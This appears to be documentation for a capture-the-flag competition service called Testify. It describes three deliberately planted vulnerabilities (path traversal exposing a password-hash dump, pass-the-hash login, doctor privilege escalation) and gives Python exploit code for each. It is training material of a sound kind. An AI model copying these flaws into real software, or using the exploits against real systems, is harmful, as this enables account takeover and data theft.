Testify Service documentation
======================

# <ins>Vulnerabilities (3)

The Testify Service consists of three different Vulnerabilities. Two of them must be exploited after each other to access FLAGSTORE #1.
The third VULN leads to FLAGSTORE #2

## VULN #1: User Password Hash Exposure

- Category: Sensitive Data Exposure
- Difficulty: Medium

When registering a new user, a `.sql` dump file of the user database containing the password hashes is created.  
The attacker can retrieve this dump file by using a modified file name when uploading his ID in the appointments
section.

## VULN #2: Pass-The-Hash

- Category: Authentication
- Difficulty: Medium

The password is not allowed to contain any special characters other than ASCII. If the user passes a password string,
that does include non-ASCII characters (*e.g. a password hash obtained by VULN#1*) the hashing of the input password
string is skipped and directly compared to the hash in the user credential databse.


## VULN #3 User Privilege Escalation

- Category: User Privelege Administration
- Difficulty: Easy

When a user makes an appointment, an additional info for the doctor is submitted optionally (FLAGSTORE). This info can only
be viewed by a doctor having set the `is_doctor` attribute in the DB (doctor01,...,doctor05). However the `check_doctor()` 
function also checks whether the accessing user shows up as a assigned doctor in the `appointment` table of the DB. If so, 
the user is also considered a doctor and access to the info field (FLAGSTORE) of any user is granted.

# <ins>Exploits

Two different exploits for VULN#1 and VULN#2 need to be run after each other to obtain a flag.

## VULN #1 :

1. Make an appointment containing a file with arbitrary content but using the filename `../online_users/dump.sql`
2. In the appointments overview section: Use the *Download ID* button to download the hijacked `dump.sql` file

### Code

```
        self.register(username, password)
        self.http_get('/about')
        
        filename = '../online_users/dump.sql'

        app_id = self.make_appointment(prename, lastname, filename, date, time, file, 'doctor0' + str(random.randint(1, 5)), pin)
        route = '/get_id' + str(app_id)

        kwargs = {
            'allow_redirects': True
        }

        res = self.http_get(route, **kwargs)
        sql_string = res.content.decode('ascii').splitlines()
        user_list = [i.split(',')[1:3] for i in sql_string]
```

## VULN #2 :

1. Retrieve a user/hash pair from .sql dump file using VULN #1
2. Pass this hash as base64 to `/login` route.
3. Search response appointment content for flag

### Code

```
    def pass_the_hash(user, hash):
        obj = {
                'username': user,
                'password': base64.b64encode(bytes.fromhex(hash)).decode('ascii'),
                'login': 'signin'
        }
        req = requests.post('http://localhost:8597/login', data=obj)
        return req.text
```

## VULN #3 :

1. Create appointment with a new user while stating this user as the doctor in the make_appointment form (using POST-request)
2. Access the `/doctors` page to retrieve the info for the users returned by `/about` page 

### Code

```
    self.register(username, password)

    app_id = self.make_appointment(prename, lastname, filename, date, time, file, username, pin)

    text = self.http_get('/about').text
    splits = text[text.find('onlineUsers'):].split('&#39;')
    splits = splits[1:]
    del splits[1::2]
    for s in splits:
        kwargs = {'data': {'patient_username': s},
                  'allow_redirects': True}
        pot_flag = self.http_post('/doctors', **kwargs)

        if flag := self.search_flag(pot_flag.text):
            return flag
```
